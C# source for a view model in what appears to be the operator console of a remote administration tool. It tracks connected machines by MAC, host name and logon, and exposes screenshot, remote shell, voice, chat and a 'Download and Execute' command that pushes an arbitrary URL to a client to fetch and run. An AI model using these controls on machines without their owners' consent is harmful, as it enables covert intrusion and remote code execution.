namespace GuiServer.View.ViewModel
{
    using Arrowgene.Services.Common;
    using Arrowgene.Services.Network.ManagedConnection.Client;
    using Server.Database.Tables;
    using GuiServer.View.Presenter;
    using GuiServer.View.Windows;
    using NetworkObjects;
    using System;
    using System.ComponentModel;
    using System.IO;
    using System.Windows.Input;
    using System.Windows.Media.Imaging;
    using System.Security.Cryptography;
    using System.Text;
    using Server.Database;
    using System.Globalization;

    public class ClientViewModel : INotifyPropertyChanged
    {
        public const string USER_FOLDER_NAME = "user";

        private ComputerInfo computerInfo;
        private RemoteShellPresenter remoteShellPresenter;
        private ScreenshotPresenter screenShotPresenter;
        private ChatPresenter chatPresenter;
        private ClientTable clientTable;
        public ChatViewModelContainer ChatViewModelContainer { get; set; }

        private bool canScreenshot;
        private bool canDisconnect;
        private bool canDownloadExecute;
        private bool canRemoteShell;
        private bool canChat;


        public ClientViewModel(ChatViewModelContainer chatViewModelContainer, ClientSocket clientSocket, ComputerInfo computerInfo)
        {
            this.ChatViewModelContainer = chatViewModelContainer;
            this.IsFromDatabase = false;
            this.ClientSocket = clientSocket;
            this.computerInfo = computerInfo;
            this.UniqueHash = GenerateUniqueHash();
            this.LoadTableData();
            this.Init();
        }

        private void LoadTableData()
        {
            this.clientTable = DatabaseManager.Instance.SelectClientTable(this.UniqueHash);
        }

        public ClientViewModel(ClientTable table)
        {
            this.IsFromDatabase = true;
            this.clientTable = table;
        }

        private string GenerateUniqueHash()
        {
            string uniqueHash = null;
            if (this.computerInfo != null)
            {
                string hashBase = this.computerInfo.IdentityName + this.ComputerInfo.MacAddress;
                MD5 md5 = new MD5CryptoServiceProvider();
                byte[] md5Hash = md5.ComputeHash(ASCIIEncoding.Default.GetBytes(hashBase));
                uniqueHash = BitConverter.ToString(md5Hash);
                uniqueHash = uniqueHash.Replace("-", "");
            }
            else
            {
                uniqueHash = GenerateRandomHash();
            }
            return uniqueHash;
        }

        private string GenerateRandomHash()
        {
            Guid guid = Guid.NewGuid();
            MD5 md5 = new MD5CryptoServiceProvider();
            byte[] md5Hash = md5.ComputeHash(ASCIIEncoding.Default.GetBytes(guid.ToString()));
            string unknownIdentityName = BitConverter.ToString(md5Hash);
            return unknownIdentityName;
        }


        public event PropertyChangedEventHandler PropertyChanged;

        public ClientSocket ClientSocket { get; set; }
        public string FullName { get { return string.Format("{0}@{1}", this.IdentityName, this.Ip); } }
        public bool CanScreenshot { get { return this.canScreenshot; } set { this.canScreenshot = value; NotifyPropertyChanged("CanScreenshot"); } }
        public bool CanDisconnect { get { return this.canDisconnect; } set { this.canDisconnect = value; NotifyPropertyChanged("CanDisconnect"); } }
        public bool CanDownloadExecute { get { return this.canDownloadExecute; } set { this.canDownloadExecute = value; NotifyPropertyChanged("CanDownloadExecute"); } }
        public bool CanRemoteShell { get { return this.canRemoteShell; } set { this.canRemoteShell = value; NotifyPropertyChanged("CanRemoteShell"); } }
        public bool CanChat { get { return this.canChat; } set { this.canChat = value; NotifyPropertyChanged("CanChat"); } }
        public string UserPath { get { return this.GenerateUserPath(); } }
        public string UniqueHash { get; set; }

        public ClientTable ClientTable { get { return this.clientTable; } }

        public ComputerInfo ComputerInfo
        {
            get
            {
                return this.computerInfo;
            }
            set
            {
                this.computerInfo = value;
                NotifyPropertyChanged("ComputerInfo");
                NotifyPropertyChanged("OsVersion");
                NotifyPropertyChanged("Device");
                NotifyPropertyChanged("HostName");
                NotifyPropertyChanged("LogonName");
            }
        }

        public string UniqueHashForDisplayOnly
        {
            get
            {
                string uniqueHashForDisplayOnly = "unknown";

                if (!string.IsNullOrEmpty(this.UniqueHash))
                {
                    uniqueHashForDisplayOnly = this.UniqueHash;
                }
                else if (this.clientTable != null)
                {
                    uniqueHashForDisplayOnly = this.clientTable.UniqueHash;
                }

                return uniqueHashForDisplayOnly;
            }
        }

        public string IdentityName
        {
            get
            {
                string identityName = "unknown";

                if (this.computerInfo != null)
                {
                    identityName = this.computerInfo.IdentityName;
                }
                else if (this.clientTable != null)
                {
                    identityName = this.clientTable.IdentityName;
                }

                return identityName;
            }
        }

        public string MacAddress
        {
            get
            {
                string mac = "unknown";

                if (this.computerInfo != null)
                {
                    mac = this.computerInfo.MacAddress;
                }
                else if (this.clientTable != null)
                {
                    mac = this.clientTable.MacAddress;
                }

                return mac;
            }
        }

        public string Ip
        {
            get
            {
                string ip = "Unknown";

                if (this.ClientSocket != null)
                {
                    if (this.ClientSocket.RemoteIPAddress != null)
                    {
                        ip = this.ClientSocket.RemoteIPAddress.ToString();
                    }
                }
                else if (this.clientTable != null)
                {
                    ip = this.clientTable.Ip;
                }

                return ip;
            }
        }

        public string OutTraffic
        {
            get
            {
                string outTraffic = "unknown";

                if (this.ClientSocket != null && this.clientTable != null)
                {
                    outTraffic = string.Format("{0}/{1}", this.GetFancyTrafficName(this.ClientSocket.OutTraffic), this.GetFancyTrafficName(this.clientTable.OutTraffic + this.ClientSocket.OutTraffic));
                }
                else if (this.ClientSocket != null)
                {
                    outTraffic = string.Format("{0}/{1}", this.GetFancyTrafficName(this.ClientSocket.OutTraffic), this.GetFancyTrafficName(this.ClientSocket.OutTraffic));
                }
                else if (this.clientTable != null)
                {
                    outTraffic = string.Format("{0}/{1}", this.GetFancyTrafficName(0), this.GetFancyTrafficName(this.clientTable.OutTraffic));
                }

                return outTraffic;
            }
        }


        public string InTraffic
        {
            get
            {
                string inTraffic = "unknown";

                if (this.ClientSocket != null && this.clientTable != null)
                {
                    inTraffic = string.Format("{0}/{1}", this.GetFancyTrafficName(this.ClientSocket.InTraffic), this.GetFancyTrafficName(this.clientTable.InTraffic + this.ClientSocket.InTraffic));
                }
                else if (this.ClientSocket != null)
                {
                    inTraffic = string.Format("{0}/{1}", this.GetFancyTrafficName(this.ClientSocket.InTraffic), this.GetFancyTrafficName(this.ClientSocket.InTraffic));
                }
                else if (this.clientTable != null)
                {
                    inTraffic = string.Format("{0}/{1}", this.GetFancyTrafficName(0), this.GetFancyTrafficName(this.clientTable.InTraffic));
                }

                return inTraffic;
            }
        }


        public string Device
        {
            get
            {
                string device = "unknown";
                if (this.computerInfo != null)
                {
                    device = this.computerInfo.Device;
                }
                else if (this.clientTable != null)
                {
                    device = this.clientTable.Device;
                }
                return device;
            }
        }

        public string HostName
        {
            get
            {
                string hostName = "unknown";
                if (this.computerInfo != null)
                {
                    hostName = this.computerInfo.HostName;
                }
                else if (this.clientTable != null)
                {
                    hostName = this.clientTable.HostName;
                }
                return hostName;
            }
        }

        public string LogonName
        {
            get
            {
                string logonName = "unknown";
                if (this.computerInfo != null)
                {
                    logonName = this.computerInfo.LogonName;
                }
                else if (this.clientTable != null)
                {
                    logonName = this.clientTable.LogonName;
                }
                return logonName;
            }
        }


        public OS.OsVersion OsVersion
        {
            get
            {
                OS.OsVersion osVersion = OS.OsVersion.UNKNOWN;

                if (this.computerInfo != null)
                {
                    osVersion = (OS.OsVersion)this.computerInfo.OsVersion;
                }
                else if (this.clientTable != null)
                {
                    osVersion = this.clientTable.OsVersion;
                }
                return osVersion;
            }
        }

        public bool IsFromDatabase { get; private set; }

        public ICommand CmdDisconnect { get; private set; }
        public ICommand CmdScreenshot { get; private set; }
        public ICommand CmdDownloadExecute { get; private set; }
        public ICommand CmdRemoteShell { get; private set; }
        public ICommand CmdChat { get; private set; }

        private void Init()
        {
            this.canScreenshot = true;
            this.canDisconnect = true;
            this.canDownloadExecute = true;
            this.canRemoteShell = true;

            this.remoteShellPresenter = new RemoteShellPresenter(this);
            this.screenShotPresenter = new ScreenshotPresenter(this);
            this.chatPresenter = new ChatPresenter(this);

            this.CmdDisconnect = new CommandHandler(() => this.Disconnect(), this.CanDisconnect);
            this.CmdScreenshot = new CommandHandler(() => this.Screenshot(), this.CanScreenshot);
            this.CmdDownloadExecute = new CommandHandler(() => this.DownloadExecute(), this.CanDownloadExecute);
            this.CmdRemoteShell = new CommandHandler(() => this.RemoteShell(), this.CanRemoteShell);
            this.CmdChat = new CommandHandler(() => this.Chat(), this.CanChat);
        }

        private string GetFancyTrafficName(Int64 traffic)
        {
            int kbyte = 1024;
            int mbyte = kbyte * 1024;
            string result = "-1";

            if (traffic > mbyte)
            {
                result = String.Format(CultureInfo.InvariantCulture, "{0:0.##} mByte", (float)traffic / (float)mbyte);
            }
            else if (traffic > kbyte)
            {
                result = String.Format(CultureInfo.InvariantCulture, "{0:0.##} kByte", (float)traffic / (float)kbyte);
            }
            else
            {
                result = String.Format("{0} byte", traffic);
            }

            return result;
        }

        public void Dispose()
        {
            if (this.chatPresenter != null)
            {
                this.chatPresenter.Dispose();
            }
        }

        public void NotifyInTrafficChanged()
        {
            this.NotifyPropertyChanged("InTraffic");
        }

        public void NotifyOutTrafficChanged()
        {
            this.NotifyPropertyChanged("OutTraffic");
        }

        public void NotifyAll()
        {
            this.NotifyPropertyChanged("");
        }


        private void Disconnect()
        {
            this.ClientSocket.Close();
        }

        private void Screenshot()
        {
            ScreenshotWindow screenShotWindow = new ScreenshotWindow();
            this.screenShotPresenter.SetScreenshotWindow(screenShotWindow);
            this.screenShotPresenter.Show();

        }

        public void UpdateScreenshotOutput(BitmapImage bitmapImage)
        {
            this.screenShotPresenter.UpdateScreenshot(bitmapImage);
        }

        private void DownloadExecute()
        {
            string downloadExec = TextInputWindow.ShowWindow("Download and Execute", "URL to download:");
            if (!string.IsNullOrEmpty(downloadExec))
            {
                this.ClientSocket.SendObject(PacketId.DOWNLOAD_AND_EXECUTE, downloadExec);
            }
        }

        private void RemoteShell()
        {
            RemoteShellWindow remoteShellWindow = new RemoteShellWindow();
            this.remoteShellPresenter.SetRemoteShellWindow(remoteShellWindow);
            this.remoteShellPresenter.Show();
        }

        public void UpdateRemoteShellOutput(string output)
        {
            this.remoteShellPresenter.UpdateOutput(output);
        }

        private void Chat()
        {
            this.chatPresenter.Show();
        }

        public void UpdateChat(string message)
        {
            this.chatPresenter.Update(message);
        }

        public void SendObject(short packetId, object myClass)
        {
            this.ClientSocket.SendObject(packetId, myClass);
            this.NotifyOutTrafficChanged();
        }

        public void SendVoice(byte[] buffer, int bytesRecorded)
        {
            this.SendObject(PacketId.VOICE, buffer);
        }

        public void NotifyPropertyChanged(string obj)
        {
            if (PropertyChanged != null)
            {
                this.PropertyChanged(this, new PropertyChangedEventArgs(obj));
            }
        }

        private string GenerateUserPath()
        {
            string path;

            if (this.ComputerInfo != null)
            {
                path = Path.Combine(Program.GetApplicationPath(), ClientViewModel.USER_FOLDER_NAME, this.ComputerInfo.HostName, this.ComputerInfo.LogonName) + @"\";
            }
            else
            {
                path = Path.Combine(Program.GetApplicationPath(), ClientViewModel.USER_FOLDER_NAME, this.IdentityName) + @"\";
            }

            return path;
        }

        public void PlayVoice(byte[] buffer)
        {
            this.chatPresenter.PlayVoice(buffer);
        }
    }
}
